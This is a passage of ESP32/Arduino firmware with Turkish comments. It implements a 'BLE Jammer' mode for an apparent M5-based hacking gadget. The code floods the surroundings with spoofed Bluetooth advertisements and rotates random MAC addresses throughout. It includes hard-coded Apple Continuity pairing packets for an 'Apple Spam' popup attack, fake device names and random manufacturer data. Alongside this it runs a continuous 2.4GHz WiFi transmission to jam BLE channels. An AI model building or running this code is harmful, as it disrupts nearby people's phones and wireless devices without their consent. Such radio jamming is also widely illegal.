          0xAA,0x30,0x01,0x00,0x00,0x45,0x00,0x00,0x00,0x00}, 20},
        {{0x0B,0xFF,0x4C,0x00,0x07,0x19,0x01,0x1E,0x20,0x75,
          0xAA,0x30}, 12},
        {{0x10,0xFF,0x4C,0x00,0x10,0x05,0x00,0x1E,0x41,0x06,
          0xFE,0xA3,0xA2,0xA2,0xA2,0xA3,0xA4}, 17},
        {{0x0D,0xFF,0x4C,0x00,0x06,0x41,0x08,0x01,0x00,0x00,
          0x10,0xAA,0x00,0x00}, 14},
        {{0x1A,0xFF,0x4C,0x00,0x02,0x15,0xB9,0x40,0x7F,0x30,
          0xF5,0xF8,0x46,0x6E,0xAF,0xF9,0x25,0x55,0x6B,0x57,
          0xFE,0x6D,0x00,0x01,0x00,0x02,0xC5}, 27},
        {{0x07,0xFF,0x4C,0x00,0x0A,0x01,0xFF,0x00}, 8},
        {{0x0F,0xFF,0x4C,0x00,0x0C,0x0E,0x00,0x1E,0x41,0x06,
          0xFE,0xA3,0xA2,0xA2,0xA2,0xA3}, 16},
    };
    static constexpr uint8_t APPLE_CNT = 8;

    static const char* NAMES[] = {
        "iPhone 15 Pro","Galaxy S25 Ultra","Pixel 9 Pro","AirPods Pro 2",
        "WH-1000XM6","Galaxy Buds3","Xiaomi Band 9","OnePlus 13",
        "Nothing Phone 3","JBL Flip 7","Bose QC60","Beats Fit Pro",
        "Tile Mate 2025","SmartTag2","Mi Watch S4","Instax Link",
        "PlayStation 5","Xbox Controller","Garmin Fenix8","Polar H10",
    };
    static constexpr uint8_t NAMES_CNT = 20;

    // ── Başlatma ekranı ───────────────────────────────────
    dispClear(); dispStatusBar("BLE Jammer");
    dispText(0, 10, "Baslatiliyor...");
    dispText(0, 22, "BLE: Raw GAP");
    dispText(0, 34, "WiFi: 2.4GHz TX");
    dispText(0, 46, "Dual-core aktif");
    dispCommit();

    // ── Core 1: Raw BLE GAP başlat ────────────────────────
    if (!rawBleInit()) {
        dispBannerErr("Raw BLE init FAIL", 1500);
        return;
    }

    // ── Core 0: WiFi 2.4GHz continuous TX başlat ─────────
    wifiTxStart();
    delay(400);

    uint32_t blePkts  = 0;
    uint32_t lastDraw = 0;
    uint8_t  mac[6];
    uint8_t  payload[31];
    uint8_t  payloadLen = 0;

    // ── Ana döngü: Core 1 — BLE raw advertising ──────────
    while (!readButtonLong()) {

        // Her turda yeni rastgele MAC (Locally Administered)
        jamBleRandMac(mac);
        // Not: Arduino BLE stack MAC'i otomatik rotate etmez,
        // ama her stop/start döngüsü yeni payload basması için yeterli

        // ── Payload oluştur (Arduino BLEAdvertisementData) ──
        BLEAdvertisementData advData;

        if (msel == 0) {
            // Full Flood: Flags + 26 byte rastgele Manufacturer Specific
            uint8_t flags[1] = {0x06};
            bleAddAD(advData, 0x01, flags, 1);
            uint8_t rnd[26]; esp_fill_random(rnd, 26);
            bleAddAD(advData, 0xFF, rnd, 26);

        } else if (msel == 1) {
            // Apple Spam
            const ApplePkt& ap = APPLE[blePkts % APPLE_CNT];
            uint8_t flags[1] = {0x06};
            bleAddAD(advData, 0x01, flags, 1);
            bleAddAD(advData, 0xFF, ap.data, ap.len);

        } else {
            // Name Flood
            const char* nm = NAMES[blePkts % NAMES_CNT];
            uint8_t nl = (uint8_t)strlen(nm);
            if (nl > 26) nl = 26;
            uint8_t flags[1] = {0x06};
            bleAddAD(advData, 0x01, flags, 1);
            bleAddAD(advData, 0x09, (const uint8_t*)nm, nl);
        }

        // ── Advertising: stop → yeni data → start ────────
        g_jamAdv->stop();
        g_jamAdv->setAdvertisementData(advData);
        g_jamAdv->start();

        vTaskDelay(1);  // WDT besle, buton kontrolüne izin ver
        blePkts++;

        // ── OLED güncelle ─────────────────────────────────
        if (millis() - lastDraw > 300) {
            lastDraw = millis();

            String modeName = (msel==0) ? "Full Flood" :
                              (msel==1) ? "Apple Spam" : "Name Flood";
            String curLabel = (msel==0) ?
                ("M:" + String(mac[0],HEX)+":"+String(mac[1],HEX)+":"+String(mac[2],HEX)) :
                (msel==1) ?
                ("AP#" + String(blePkts % APPLE_CNT)) :
                String(NAMES[blePkts % NAMES_CNT]).substring(0,16);

            dispClear();
            dispStatusBar("BLE Jammer++");
            dispText(0, 10, modeName);
            dispText(0, 20, "BLE: " + String(blePkts));
            // WiFi TX kanalını göster
            uint8_t wch = BLE_COVER_CHANNELS[(blePkts/20) % BLE_CH_CNT];
            dispText(0, 30, "WiFi CH" + String(wch) + " [2.4GHz]");
            dispText(0, 40, curLabel);
            dispText(0, 52, "[LONG] dur");
            dispCommit();
        }
    }

    // ── Temizlik ──────────────────────────────────────────
    wifiTxStop();      // Core 0 task'ı durdur
    rawBleDeinit();    // BLE stack'i kapat

    // Arduino BLE stack'i geri başlat
    BLEDevice::init("M5Sharkino");

    logPush("[BLE_JAM++] mode=" + String(msel) +
            " ble_pkts=" + String(blePkts));
    dispBannerOK("BLE Jammer durduruldu");
    dispBanner("BLE:" + String(blePkts), 900);
}


